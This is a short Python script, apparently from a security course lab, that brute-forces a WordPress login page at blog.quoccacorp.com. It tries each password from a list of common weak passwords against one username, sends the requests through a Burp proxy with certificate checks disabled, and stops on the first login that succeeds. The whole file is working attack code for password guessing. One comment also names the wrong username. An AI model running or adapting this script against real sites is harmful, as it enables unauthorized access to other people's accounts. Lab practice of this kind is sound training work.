import requests
import time
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# This session object saves our config so we don't need to set it every time.
s = requests.session()
# Skip trying to verify TLS certs, due to Burp's CA.
s.verify = False
# Proxy requests through Burp.
s.proxies = {"https": "http://127.0.0.1:8080"}

# Read passwords from file
with open(r'C:\Users\13693\Downloads\500-worst-passwords.txt', 'r') as file:
    passwords = file.read().splitlines()

# Attempt to login with each password
for password in passwords:
    print(f"Trying password: {password}")
    
    data = {
        'log': 'ihaveabadpassword',  # Assuming the username is 'admin'
        'pwd': password.encode(),
    }
    
    response = s.post("https://blog.quoccacorp.com/wp-login.php", data=data)
    
    if "login_error" not in response.text:
        print(f"Successful login with password: {password}")
        break
    
    time.sleep(0.1)
